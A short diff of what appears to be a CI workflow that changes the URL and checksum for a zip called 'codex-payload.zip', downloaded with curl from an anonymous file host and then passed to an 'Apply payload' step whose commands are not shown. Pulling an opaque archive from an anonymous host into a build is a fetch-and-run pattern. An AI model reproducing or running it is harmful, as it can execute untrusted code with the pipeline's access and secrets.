@@ -19,8 +19,8 @@ jobs:
 
       - name: Download payload
         run: |
-          curl -L "https://files.catbox.moe/b6a2ui.zip" -o codex-payload.zip
-          echo "518918610143980ce2f7823e0853e799980de4af6b970481b9f54c1006502158  codex-payload.zip" | sha256sum -c -
+          curl -L "https://files.catbox.moe/iraxnq.zip" -o codex-payload.zip
+          echo "c520cae663589b650cee9c773c1cad75d8f73d49f97ce105101ae37fdfe08508  codex-payload.zip" | sha256sum -c -
 
       - name: Apply payload
         run: |
